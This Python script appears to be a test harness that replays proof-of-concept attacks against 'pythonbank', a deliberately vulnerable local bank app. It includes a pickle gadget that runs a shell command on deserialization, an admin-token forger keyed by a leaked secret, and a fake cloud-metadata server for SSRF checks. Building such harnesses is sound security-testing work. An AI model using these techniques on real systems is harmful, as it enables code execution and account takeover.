#!/usr/bin/env python3
"""Replays pythonbank's PoCs against a real server over real HTTP.

    python scripts/replay_poc.py --all
    python scripts/replay_poc.py VULN-001 --base http://127.0.0.1:4003

Unless --base is given, the target is booted here (``python -m pythonbank.app``),
waited for on /health and stopped afterwards unless --keep is passed.

Exit code 0 only when every requested PoC reproduced. Each PoC's predicate is
the ``expect_expr`` in manifest.yaml, a Python expression evaluated with these
names in scope:

    status, body, text, json, headers, probe, static, db, md5_hex, isinstance

``probe`` carries ``runs`` (``repeat``) and ``alt_runs`` (``alt_body``) with
``status``/``body``/``json``/``ms`` per run; ``db`` is the first column of the
entry's ``db`` query run against the target's SQLite file; ``static`` maps
``static_files`` entries to their source text.

Placeholders substituted into requests: ``{{BASE}}``, ``{{PROBE_PORT}}``,
``{{NONCE}}``, ``{{PICKLE_PAYLOAD}}``, ``{{ALICE_TOKEN}}`` (a real login) and
``{{FORGED_ADMIN_TOKEN}}`` (forged with the secret ``GET /api/config``
discloses — the attack needs no account).
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import http.server
import json
import os
import pickle
import secrets
import sqlite3
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Any

import requests
import yaml

BANK_ROOT = Path(__file__).resolve().parents[1]
MANIFEST_PATH = BANK_ROOT / "manifest.yaml"
DEFAULT_BASE = "http://127.0.0.1:4003"
DEFAULT_PORT = 4003
HEALTH_TIMEOUT_S = 30.0

sys.path.insert(0, str(BANK_ROOT / "src"))
from pythonbank.db import db_path, md5_hex  # noqa: E402  (the target's own helpers)

ALICE_PASSWORD = "Alice!Passw0rd1"

PROBE_BODIES = {
    "/ssrf-marker": "ssrf-marker-ok\n",
    "/latest/meta-data/": (
        "ami-id=ami-pythonbankprobe\n"
        "instance-id=i-pythonbankprobe\n"
        'iam/security-credentials/pythonbank-role={"AccessKeyId":"ASIAPYTHONBANKPROBE"}\n'
    ),
}


def load_manifest() -> dict[str, Any]:
    with open(MANIFEST_PATH, encoding="utf-8") as handle:
        return yaml.safe_load(handle)


class _PickleMarker:
    """Unpickles into ``subprocess.getoutput('echo ...')`` on the server."""

    def __reduce__(self):
        return (subprocess.getoutput, ("echo pythonbank-pickle-marker",))


def build_pickle_payload() -> str:
    return base64.b64encode(pickle.dumps(_PickleMarker())).decode("ascii")


class _ProbeHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self) -> None:  # noqa: N802 (http.server API)
        body = PROBE_BODIES.get(self.path) or f"probe-path={self.path}\n"
        data = body.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, format: str, *args: Any) -> None:  # noqa: A002
        """Keep the replay output about the PoCs, not the probe traffic."""


class ProbeServer:
    """A local stand-in for the SSRF targets (metadata service included)."""

    def __init__(self) -> None:
        self._server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _ProbeHandler)
        self.port = int(self._server.server_address[1])
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

    def close(self) -> None:
        self._server.shutdown()
        self._server.server_close()


def parse_raw_request(raw: str) -> tuple[str, str, dict[str, str], str]:
    """Split a manifest request block into (method, path, headers, body)."""
    normalized = raw.replace("\r\n", "\n")
    head, _, body = normalized.partition("\n\n")
    lines = [line for line in head.split("\n") if line.strip()]
    request_parts = lines[0].split()
    method, path = request_parts[0], request_parts[1]
    headers: dict[str, str] = {}
    for line in lines[1:]:
        name, _, value = line.partition(":")
        if name.strip():
            headers[name.strip()] = value.strip()
    if "multipart/form-data" in head:
        body = body.replace("\r\n", "\n").replace("\n", "\r\n")
        if not body.endswith("\r\n"):
            body += "\r\n"
    elif body.endswith("\n"):
        body = body[:-1]
    return method, path, headers, body


def send(base: str, method: str, path: str, headers: dict[str, str], body: str) -> requests.Response:
    return requests.request(
        method,
        base + path,
        headers=headers,
        data=body.encode("utf-8") if body else None,
        timeout=15,
        allow_redirects=False,
    )


def ctx_for(response: requests.Response) -> dict[str, Any]:
    text = response.text
    try:
        parsed = json.loads(text)
    except ValueError:
        parsed = None
    return {
        "status": response.status_code,
        "body": text,
        "text": text,
        "json": parsed,
        "headers": {name.lower(): value for name, value in response.headers.items()},
        "ms": 0.0,
    }


def login(base: str, username: str, password: str) -> str:
    response = requests.post(
        base + "/api/auth/login",
        json={"username": username, "password": password},
        timeout=10,
    )
    return str(response.json()["token"])


def forge_token_with_secret(username: str, role: str, secret: str) -> str:
    """The attacker's copy of the signing scheme, keyed by the disclosed secret."""
    payload = (
        base64.urlsafe_b64encode(
            json.dumps(
                {"username": username, "role": role, "iat": int(time.time())},
                separators=(",", ":"),
            ).encode("utf-8")
        )
        .decode("ascii")
        .rstrip("=")
    )
    signature = hmac.new(secret.encode("utf-8"), payload.encode("ascii"), hashlib.sha256)
    return f"{payload}.{signature.hexdigest()}"


def resolve_headers(headers: dict[str, str], base: str) -> dict[str, str]:
    resolved = dict(headers)
    for name, value in headers.items():
        if value == "Bearer {{ALICE_TOKEN}}":
            resolved[name] = "Bearer " + login(base, "alice", ALICE_PASSWORD)
        elif value == "Bearer {{FORGED_ADMIN_TOKEN}}":
            config = requests.get(base + "/api/config", timeout=10).json()
            resolved[name] = "Bearer " + forge_token_with_secret(
                "admin", "admin", str(config["token_secret"])
            )
    return resolved


def db_query(sql: str) -> str:
    conn = sqlite3.connect(db_path())
    try:
        row = conn.execute(sql).fetchone()
    finally:
        conn.close()
    return "" if row is None else str(row[0])


def substitute(value: str, base: str, probe_port: int, nonce: str) -> str:
    return (
        value.replace("{{BASE}}", base)
        .replace("{{PROBE_PORT}}", str(probe_port))
        .replace("{{NONCE}}", nonce)
        .replace("{{PICKLE_PAYLOAD}}", build_pickle_payload())
    )


ALLOWED_NAMES = {
    "isinstance": isinstance,
    "len": len,
    "all": all,
    "any": any,
    "str": str,
    "int": int,
    "float": float,
    "bool": bool,
    "min": min,
    "max": max,
    "abs": abs,
    "round": round,
}


def evaluate(expr: str, names: dict[str, Any]) -> bool:
    return bool(eval(expr, {"__builtins__": {}}, {**ALLOWED_NAMES, **names}))  # noqa: S307


def replay_one(
    entry: dict[str, Any], base: str, probe_port: int, nonce: str
) -> tuple[bool, str]:
    poc = entry["poc"]
    static = {
        rel: (BANK_ROOT / rel).read_text(encoding="utf-8")
        for rel in poc.get("static_files", [])
    }

    if poc.get("setup"):
        method, path, headers, body = parse_raw_request(
            substitute(str(poc["setup"]), base, probe_port, nonce)
        )
        setup_response = send(base, method, path, resolve_headers(headers, base), body)
        if setup_response.status_code >= 400:
            return False, f"setup failed with status {setup_response.status_code}"

    method, path, headers, body = parse_raw_request(
        substitute(str(poc["request"]), base, probe_port, nonce)
    )
    response = send(base, method, path, resolve_headers(headers, base), body)
    ctx = ctx_for(response)

    probe: dict[str, Any] = {"runs": [], "alt_runs": []}
    for _ in range(int(poc.get("repeat") or 0)):
        started = time.perf_counter()
        run = send(base, method, path, resolve_headers(headers, base), body)
        item = ctx_for(run)
        item["ms"] = round((time.perf_counter() - started) * 1000, 1)
        probe["runs"].append(item)

    if poc.get("alt_body"):
        alt_body = substitute(str(poc["alt_body"]), base, probe_port, nonce)
        alt_response = send(base, method, path, resolve_headers(headers, base), alt_body)
        probe["alt_runs"].append(ctx_for(alt_response))

    db_value = ""
    if poc.get("db"):
        db_value = db_query(substitute(str(poc["db"]), base, probe_port, nonce))

    names: dict[str, Any] = {
        "status": ctx["status"],
        "body": ctx["body"],
        "text": ctx["text"],
        "json": ctx["json"],
        "headers": ctx["headers"],
        "probe": probe,
        "static": static,
        "db": db_value,
        "md5_hex": md5_hex,
    }
    expr = str(poc["expect_expr"])
    try:
        reproduced = evaluate(expr, names)
    except Exception as exc:  # a broken predicate must be reported, not crash the run
        return False, f"status={ctx['status']} but expect_expr raised {type(exc).__name__}: {exc}"
    if reproduced:
        return True, f"status={ctx['status']}"
    return False, f"status={ctx['status']} but expect_expr not satisfied: {expr}"


def boot_server(base: str, port: int) -> subprocess.Popen:
    env = {**os.environ, "PYTHONPATH": str(BANK_ROOT / "src"), "PYTHONBANK_PORT": str(port)}
    process = subprocess.Popen(
        [sys.executable, "-m", "pythonbank.app"],
        cwd=str(BANK_ROOT),
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.STDOUT,
    )
    deadline = time.time() + HEALTH_TIMEOUT_S
    while time.time() < deadline:
        if process.poll() is not None:
            raise SystemExit(f"pythonbank exited during boot with code {process.returncode}")
        try:
            if requests.get(base + "/health", timeout=1).status_code == 200:
                return process
        except requests.RequestException:
            pass
        time.sleep(0.3)
    process.terminate()
    raise SystemExit(f"pythonbank did not become healthy on {base} within {HEALTH_TIMEOUT_S:.0f}s")


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay pythonbank PoCs over real HTTP.")
    parser.add_argument("ids", nargs="*", help="manifest ids to replay (default: all)")
    parser.add_argument("--all", action="store_true", help="replay every entry in manifest.yaml")
    parser.add_argument("--base", default=None, help="use an already-running target at this URL")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="port to boot on")
    parser.add_argument("--keep", action="store_true", help="leave a booted target running")
    args = parser.parse_args()

    manifest = load_manifest()
    entries = manifest["vulns"]
    if args.ids:
        wanted = set(args.ids)
        entries = [entry for entry in entries if entry["id"] in wanted]
        missing = wanted - {entry["id"] for entry in entries}
        if missing:
            print(f"unknown ids: {', '.join(sorted(missing))}", file=sys.stderr)
            return 2
    if not entries:
        print("no PoCs selected", file=sys.stderr)
        return 2

    nonce = secrets.token_hex(4)
    probe = ProbeServer()
    server: subprocess.Popen | None = None
    base = args.base or f"http://127.0.0.1:{args.port}"
    try:
        if args.base is None:
            server = boot_server(base, args.port)
        results: list[tuple[str, bool, str]] = []
        for entry in entries:
            reproduced, detail = replay_one(entry, base, probe.port, nonce)
            results.append((entry["id"], reproduced, detail))
            verdict = "reproduced" if reproduced else "MISS"
            print(f"{entry['id']}  {verdict:<11} {detail}")
        passed = sum(1 for _id, ok, _detail in results if ok)
        print()
        print(f"reproduced: {passed} / {len(results)}")
        return 0 if passed == len(results) else 1
    except requests.RequestException as exc:
        print(f"cannot reach the target at {base}: {exc}", file=sys.stderr)
        return 2
    finally:
        probe.close()
        if server is not None and not args.keep:
            server.terminate()
            try:
                server.wait(timeout=10)
            except subprocess.TimeoutExpired:
                server.kill()


if __name__ == "__main__":
    sys.exit(main())
